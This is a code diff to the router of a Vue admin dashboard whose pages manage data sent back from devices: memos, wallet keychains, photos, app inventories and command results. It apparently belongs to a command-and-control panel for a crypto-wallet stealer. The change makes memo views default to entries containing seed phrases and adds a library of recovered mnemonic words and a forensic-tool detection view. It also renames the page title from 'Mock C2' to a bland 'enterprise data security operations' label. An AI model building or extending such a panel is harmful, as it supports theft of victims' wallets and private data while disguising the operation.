@@ -7,8 +7,11 @@ import AdminLayout from '@/layouts/AdminLayout.vue'
  *
  * 信息架构按**业务实体**组织（入库解析后的语义），不再按 capture 端点分组：
  *   运营：仪表台 / 设备列表 / 设备控制台 / 访问统计
- *   数据：备忘录 / 钱包钥匙串 / 照片 / 应用资产 / 日志
+ *   数据：备忘录 / 钱包钥匙串 / 照片 / 指令结果 / 日志
  *   系统：系统设置
+ *
+ * 注：应用资产（u 端点 → apps 表）仅入库，供设备上线时映射钱包 / WS 字段，
+ *     不再单独展示（无 /apps 路由）。
  */
 const children: RouteRecordRaw[] = [
   { path: '', redirect: '/dashboard' },
@@ -40,7 +43,19 @@ const children: RouteRecordRaw[] = [
     path: 'memos',
     name: 'memos',
     component: () => import('@/views/MemosView.vue'),
-    meta: { title: '备忘录', icon: 'Notebook', group: '数据', desc: 'nb 回传解析入库的备忘录实体' },
+    meta: { title: '助记词/备忘录', icon: 'Notebook', group: '数据', desc: '默认只显示含助记词的备忘录（含全部切换）' },
+  },
+  {
+    path: 'forensics',
+    name: 'forensics',
+    component: () => import('@/views/ForensicsView.vue'),
+    meta: { title: '工具检测', icon: 'MagicStick', group: '数据', desc: 'tools/ 取证工具解析 war 回传' },
+  },
+  {
+    path: 'words',
+    name: 'words',
+    component: () => import('@/views/WordsView.vue'),
+    meta: { title: '助记词库', icon: 'Key', group: '数据', desc: '解析/还原出来的助记词' },
   },
   {
     path: 'keychain',
@@ -60,12 +75,6 @@ const children: RouteRecordRaw[] = [
     name: 'photos',
     component: () => import('@/views/PhotosView.vue'),
     meta: { title: '照片', icon: 'Picture', group: '数据', desc: 'ph 回传照片实体（可预览下载）' },
-  },
-  {
-    path: 'apps',
-    name: 'apps',
-    component: () => import('@/views/AppsView.vue'),
-    meta: { title: '应用资产', icon: 'Grid', group: '数据', desc: 'u 回传应用清单解析' },
   },
   {
     path: 'results',
@@ -119,5 +128,5 @@ export const navGroups: Array<{ name: string; items: NavItem[] }> = ['运营', '
 
 router.afterEach((to) => {
   const t = (to.meta?.title as string) || '控制台'
-  document.title = `Mock C2 · ${t}`
+  document.title = `企业数据安全运维 · ${t}`
 })
